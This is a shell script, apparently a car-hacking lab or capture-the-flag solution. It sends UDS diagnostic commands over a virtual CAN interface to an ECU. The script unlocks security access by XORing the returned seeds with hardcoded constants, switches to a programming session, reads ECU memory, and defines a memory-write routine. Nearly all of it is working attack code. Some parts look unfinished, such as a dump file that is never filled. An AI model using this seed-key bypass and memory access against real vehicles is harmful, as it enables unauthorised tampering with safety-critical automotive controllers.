#!/usr/bin/env sh



cleanup() {
   for pid in $kids
   do
      if kill -0 $pid 2>/dev/null; then
         kill $pid
      fi
   done
   exit 0 
}

trap 'cleanup' EXIT INT TERM KILL HUP 



UDS() {
   echo "$*" | isotpsend -s 7E0 -d 7E8 vcan0
}


TESTER_PRESENT() {
   while true; do UDS 3E 00; sleep 5; done & kids="$kids $!"
}


DEFAULT_SESSION() {
   UDS 10 01
}

PROG_SESSION() {
   UDS 10 02
}

EXT_SESSION() {
   UDS 10 03
}


REQ_SEED() {

   sleep 0.5; UDS 27 03 &
   SEED=$(isotprecv -s 7E0 -d 7E8 vcan0)
   if [ "$(echo $SEED | cut -d ' ' -f-2)" = "67 03" ]; then

      echo $SEED | cut -d ' ' -f 3-5 -O ''
   else
      exit 1
   fi
}

REQ_KEY() {
   UDS 27 04 $1 $2
}


SEC_ACCESS_1() {

   sleep 0.5; UDS 27 01 &
   res=$(isotprecv -s 7E0 -d 7E8 vcan0)
   rid=$(echo $res | cut -d ' ' -f-1)
   case $rid in
      67)
	 SEED=$(echo $res | cut -d ' ' -f 3-7 -O '')
	 KEY=$(printf "%08X" "$((0x$SEED ^ 0x7D709F4D))" | sed 's/../& /g')
         UDS 27 02 $KEY



	 ;;
   esac

   
}



WRITE_MEM() {
   addr=$(printf "%08X" $((0x$1)) | sed 's/../& /g')
   size=$(printf "%04x" $2 | sed 's/../& /g')
   
   UDS 3D 24 $addr $size $* & req=$!


}


READ_MEM() {
   addr=$(printf "%08X" $((0x$1)) | sed 's/../& /g')
   size=$(printf "%04x" $2 | sed 's/../& /g')
   
   sleep 0.2; UDS 23 24 $addr $size & req=$!

   res=$(isotprecv -s 7E0 -d 7E8 vcan0)
   rid=$(echo $res | cut -d ' ' -f 1)
   case $rid in
      63)
         echo $res | cut -d ' ' -f 2-
	 ;;
      7E)
         echo "Negative Response .... "
   esac
}


EXT_SESSION
TESTER_PRESENT

sleep 0.5

SEED=$(REQ_SEED)
KEY=$(printf "%04X" $((0x$SEED ^ 0xFFFF))  | sed 's/../& /g')
REQ_KEY $KEY


PROG_SESSION

sleep 1
printf "" > memdump.txt

SADDR=1A000
PGS=32
PGN=5000

OUTPUT=$( READ_MEM $(printf "%08X" $((0x$SADDR)))  4 | cut -d ' ' -f-4 -O '' )


SEC_ACCESS_1 $OUTPUT


#printf "%s\n" "$(tr -d '\n' < memdump.txt | fold -w 96 | xxd -r -p -c 32)"

sleep 1
DEFAULT_SESSION

